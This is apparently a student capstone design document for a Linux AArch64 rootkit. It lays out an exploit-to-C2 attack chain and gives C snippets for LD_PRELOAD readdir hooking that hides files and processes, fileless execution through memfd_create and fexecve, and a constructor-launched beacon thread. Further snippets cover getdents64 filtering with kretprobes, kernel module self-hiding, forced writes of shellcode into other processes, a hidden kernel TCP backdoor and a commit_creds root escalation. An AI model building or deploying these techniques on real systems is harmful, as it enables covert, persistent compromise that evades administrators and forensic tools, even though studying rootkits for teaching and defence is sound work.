[capstone mindmap.md](https://github.com/user-attachments/files/26382842/capstone.mindmap.md)
# Capstone Rootkit — Theoretical Design

## Big Picture

The attack chain has four stages:

```
Stage 0: Exploit MERIDIAN (TCP :1337) → userland code execution as unprivileged user
Stage 1: Use vuln_rwx.ko or vuln_rw.ko → escalate to EL1 (kernel privilege)
Stage 2: Deploy rootkit (librootkit.so + rootkit.ko) → persistence, hiding, backdoor
Stage 3: Beacon calls home → C2 server issues commands
```

Two components make up the rootkit and they work together:

|Component|Runs where|Language|Does what|
|---|---|---|---|
|`librootkit.so`|Userland (LD_PRELOAD)|C|Intercepts libc, hides files/procs, diskless exec, encrypted beacon|
|`rootkit.ko`|Kernel (EL1)|C|kretprobe hooks, module self-hiding, code injection, kernel backdoor|

The separation is intentional. Userland hooks are easier to write and sufficient for most concealment. The kernel module is needed for things that userland simply cannot do: filtering `getdents64` results before they reach any process, hiding the module itself from `lsmod`, and injecting code into arbitrary processes from a privileged kernel context.

---

## Part A — Userland Rootkit (`librootkit.so`)

`LD_PRELOAD` causes the dynamic linker to load our `.so` into every new process before any other library. When our library exports a symbol with the same name as a libc function (e.g., `readdir`), calls to that function from the process go to our version first. You call the real function via `dlsym(RTLD_NEXT, "readdir")` — `RTLD_NEXT` means "find the next definition of this symbol in the load order", which is the real libc one.

### Feature 1: File and Process Hiding

`ls`, `find`, Python's `os.listdir`, everything — they all eventually call `readdir()` or `readdir64()`. These functions return one directory entry at a time. You wrap them and silently skip any entry whose name starts with our magic prefix (e.g., `ghost_`):

```c
struct dirent *readdir(DIR *dirp) {
    typeof(readdir) *real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real(dirp)) != NULL) {
        if (strncmp(entry->d_name, "ghost_", 6) == 0)
            continue;   // invisible — call real readdir again
        return entry;
    }
    return NULL;
}
```

Process hiding is identical. `/proc` is a virtual filesystem, so `ls /proc` goes through `readdir` just like any other directory. If a process has PID 1234 and you've named it `ghost_1234`, the directory entry `/proc/ghost_1234` is filtered before any tool sees it. The process is still running; it just doesn't appear in `ps`, `top`, or `/proc`.

### Feature 2: Diskless ELF Execution

The goal: execute a binary without it ever existing as a file on disk. The mechanism:

1. `memfd_create("", MFD_CLOEXEC)` creates an anonymous, unnamed file that exists only in RAM. It has a file descriptor but no path in the filesystem.
2. `write(fd, elf_bytes, elf_size)` writes the ELF binary bytes directly into that anonymous file.
3. `fexecve(fd, argv, envp)` executes the ELF directly from the file descriptor — no path needed.

The resulting process does appear in `ps`, but its executable path shows as `/proc/self/fd/N` — a number, not a meaningful filename — and there is no backing file to find on disk. This is how you launch the beacon payload: the ELF bytes live in a C array inside `librootkit.so`, and `fexecve` runs them without ever touching the filesystem.

### Feature 3: Self-Concealment (`/proc` filtering)

Even though there's no file on disk, a determined analyst can run `cat /proc/<pid>/maps` and see that `librootkit.so` is loaded. You prevent this by hooking `fopen()` and `open()`. When those functions are called with a path that matches `/proc/self/maps` or `/proc/<pid>/environ`, you intercept the read, strip out any lines that mention `librootkit.so` or our memfd path, and return the sanitized content. Tools like `ldd`, `pmap`, and manual `/proc` inspection get a version of the file that doesn't mention you.

### Feature 4: Encrypted Beacon

The beacon auto-starts the moment `librootkit.so` is loaded into any process, using a GCC constructor attribute:

```c
__attribute__((constructor))
static void beacon_init(void) {
    pthread_t t;
    pthread_create(&t, NULL, beacon_loop, NULL);
    pthread_detach(t);
}
```

Constructors run before `main()`. This means as soon as any process loads the library — whether via `LD_PRELOAD` or injection — a background thread starts and begins trying to reach the C2 server. See the **Encrypted Beacon Payload** section for the full design.

---

## Part B — Kernel Rootkit (`rootkit.ko`)

Loaded as a kernel module, running at EL1. Userland hooks can be bypassed by calling syscalls directly (using `syscall()` in C or raw `svc #0` in assembly). Kernel hooks cannot — every `getdents64` syscall from every process on the system goes through our kretprobe, with no way to skip it from userland.

### Feature 1: Kernel-Level File/Process Hiding (kretprobe)

A kretprobe fires after a function returns. You attach one to `sys_getdents64` (the kernel's implementation of the `getdents64` syscall). After the syscall fills the user buffer with directory entries and returns, our handler gets control. You walk the `linux_dirent64` chain in that buffer and remove hidden entries by adjusting `d_reclen` — making one entry's length field span over the next entry, effectively erasing it from the chain.

```c
static int getdents64_ret_handler(struct kretprobe_instance *ri,
                                   struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = /* saved in entry handler */;
    long ret = regs_return_value(regs);
    // walk dirent chain, unlink matching entries by adjusting d_reclen
    return 0;
}
```

**AArch64 caveat:** kretprobes set up a trampoline frame. The `pt_regs` you receive in the return handler belong to that trampoline, not the original syscall invocation. This means you cannot read the original argument registers (x0–x5) from the return handler's `pt_regs`. You must save them in the entry handler into `ri->data` (per-instance scratch space) and read them back in the return handler.

### Feature 2: Module Self-Hiding

The kernel keeps loaded modules in a doubly-linked list. `lsmod` and `/proc/modules` read this list. You remove ourself from it:

```c
list_del_init(&THIS_MODULE->list);
```

`list_del_init` unlinks the module's list node and reinitializes it to point to itself (safe for later `list_del` calls on an already-unlinked node). After this runs — typically as the last line of our `init_module` — the module is invisible to `lsmod`, `cat /proc/modules`, `cat /sys/module/*`, and `modinfo`. The module code and data are still in kernel memory and fully executing. You're just not on the list.

### Feature 3: Userland Process Code Injection

From the kernel you can write into any process's virtual memory and redirect its execution. The two key kernel functions:

**`access_process_vm`** — copies bytes into (or out of) another process's address space:

```c
access_process_vm(task, target_addr, shellcode, shellcode_len, FOLL_WRITE | FOLL_FORCE);
```

`FOLL_FORCE` bypasses write protection on pages that are marked read-only or executable-only. This is how you write shellcode into a process that has W^X enforcement.

**`task_pt_regs`** — returns a pointer to the saved register state for a task (the registers that will be restored when the task is next scheduled back in):

```c
struct pt_regs *regs = task_pt_regs(task);
regs->pc = (unsigned long)shellcode_addr;
```

On the next scheduling tick, the task resumes with PC pointing at our shellcode.

### Feature 4: Kernel Network Backdoor

A kthread in the kernel opens a TCP socket that bypasses all userland network visibility:

```c
sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &server_sock);
kernel_bind(server_sock, &addr, sizeof(addr));
kernel_listen(server_sock, 5);
while (!kthread_should_stop()) {
    kernel_accept(server_sock, &client_sock, 0);
    // verify 16-byte magic handshake
    // if valid: accept commands (inject PID, hide file, exec shellcode)
}
```

The socket is created in kernel space and is not registered through the normal socket file descriptor table. Userland tools (`ss`, `netstat`, `lsof`) enumerate sockets by reading `/proc/net/tcp` or through the kernel's socket list — a manually managed kernel socket can be excluded from that list, making the listener invisible to those tools while remaining fully functional.

### Feature 5: Privilege Escalation Helper

Either exposed via ioctl before self-hiding, or triggered through the kernel backdoor. Grants root credentials to the calling process:

```c
struct cred *new = prepare_creds();
new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
commit_creds(new);
```

`prepare_creds()` copies the current credential set. `commit_creds()` atomically installs the new credentials for the calling task. After this returns, `getuid()` returns 0.

---
